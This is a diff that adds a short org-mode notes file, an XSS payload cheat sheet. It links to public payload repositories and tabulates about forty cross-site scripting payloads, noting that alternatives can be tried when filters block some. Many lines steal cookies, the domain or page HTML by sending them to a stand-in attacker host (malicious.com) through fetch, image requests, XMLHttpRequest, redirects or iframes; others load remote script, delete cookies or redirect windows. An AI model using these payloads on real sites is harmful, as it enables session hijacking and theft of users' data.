@@ -1,0 +1,59 @@
+#+title: Xss Payload List
+#+author: gabriel
+
+* Common XSS Payload List
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS
+https://github.com/payloadbox/xss-payload-list
+https://github.com/s0md3v/AwesomeXSS
+https://github.com/pgaijin66/XSS-Payloads
+
+
+Some XSS payloads may be blocked by security systems, or the payloads sent may not work due to the structure of the target system
+
+In such cases, different payloads with varying functionalities can be used.
+
+| Payload	Description
+<script>alert('XSS')</script>	Displays a simple alert box, verifying that XSS is working.
+<script>alert(document.cookie)</script>	Shows the user's cookie information.
+<script>alert(document.domain)</script>	Displays the domain information of the page.
+<img src="x" onerror="alert('XSS')">	Executes the alert function due to a failed image load.
+<svg/onload=alert('XSS')>	Executes the alert function when an SVG graphic loads.
+"><script>alert('XSS')</script>	Executes a script within an unclosed HTML tag.
+<body onload=alert('XSS')>	Executes a script when the body tag loads.
+<iframe src="javascript:alert('XSS')">	Runs JavaScript code within an iframe.
+<input type="text" value="<script>alert('XSS')</script>">	Injects a script into an input field.
+javascript:alert('XSS')	Directly executes JavaScript code through a link.
+onmouseover="alert('XSS')"	Executes a script when the mouse hovers over an element.
+"><iframe src="javascript:alert('XSS')"></iframe>	Runs malicious JavaScript within an iframe.
+<script src="http://example.com/malicious-code.js"></script>	Loads and executes an external JavaScript file.
+"><img src="javascript:alert('XSS')">	Executes JavaScript code through an image element.
+<div style="background:url('javascript:alert('XSS')')"></div>	Executes JavaScript code within CSS.
+<script>document.write('<img src="x" onerror="alert('XSS')">')</script>	Writes a script onto the document and executes XSS.
+<a href="javascript:alert('XSS')">Click me!</a>	Executes JavaScript code when the user clicks the link.
+<embed src="javascript:alert('XSS')">	Executes JavaScript code with an embed tag.
+<object data="javascript:alert('XSS')">	Executes JavaScript code with an object tag.
+<style>@import 'javascript:alert("XSS")';</style>	Executes JavaScript within a style definition.
+"><style>@import 'javascript:alert("XSS")';</style>	Executes XSS within a style definition inside an unclosed HTML tag.
+<script>fetch("http://malicious.com/?cookie="+document.cookie)</script>	Steals the user's cookies and sends them to the specified site.
+<script>document.location='http://malicious.com/?cookie=' + document.cookie;</script>	Steals user cookies and sends them to the specified site.
+<script>new Image().src='http://malicious.com/?data=' + document.domain;</script>	Steals the user's domain information and sends it to the specified site.
+<script>new Image().src='http://malicious.com/?data=' + encodeURIComponent(document.body.innerHTML);</script>	Steals the page's HTML content and sends it to the specified site.
+<script>fetch('https://malicious.com', { method: 'POST', body: JSON.stringify({cookie: document.cookie, location: document.location}) });</script>	Sends sensitive information such as cookies and URL details to the specified site.
+<script>document.cookie='username=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';</script>	Deletes the user's cookies.
+<script>document.domain='malicious.com';</script>	Changes the domain of the page, potentially affecting security policies.
+"><script>document.location='http://malicious.com?cookie=' + document.cookie;</script>	Sends cookie information to an external server.
+"><script>document.location='javascript:alert(document.cookie)';</script>	Displays user cookie information in an alert.
+"><script>document.location='javascript:alert(document.domain)';</script>	Displays domain information in an alert.
+<script>xhr=new XMLHttpRequest();xhr.open('GET','https://malicious.com?cookie='+document.cookie,true);xhr.send();</script>	Sends cookie information to a server using AJAX.
+<script>xhr=new XMLHttpRequest();xhr.open('GET','https://malicious.com?data='+document.domain,true);xhr.send();</script>	Sends domain information to a server using AJAX.
+<script>var img=document.createElement('img');img.src='https://malicious.com?cookie='+document.cookie;document.body.appendChild(img);</script>	Steals cookie information through an image request.
+<script>var img=document.createElement('img');img.src='https://malicious.com?data='+document.domain;document.body.appendChild(img);</script>	Steals domain information through an image request.
+<script>document.write('<iframe src="http://malicious.com?cookie=' + document.cookie + '"></iframe>');</script>	Creates and sends an iframe containing cookie information.
+<script>document.write('<iframe src="http://malicious.com?data=' + document.domain + '"></iframe>');</script>	Creates and sends an iframe containing domain information.
+<script>localStorage.setItem('data', document.cookie);</script>	Saves cookie information to local storage.
+<script>sessionStorage.setItem('data', document.domain);</script>	Saves domain information to session storage.
+<script>top.location=document.referrer;</script>	Redirects the page source to the top frame.
+<script>window.opener.location='http://malicious.com';</script>	Redirects the main page of a newly opened window to a malicious site.
+<script>window.parent.location='http://malicious.com';</script>	Redirects the parent window to a malicious site.
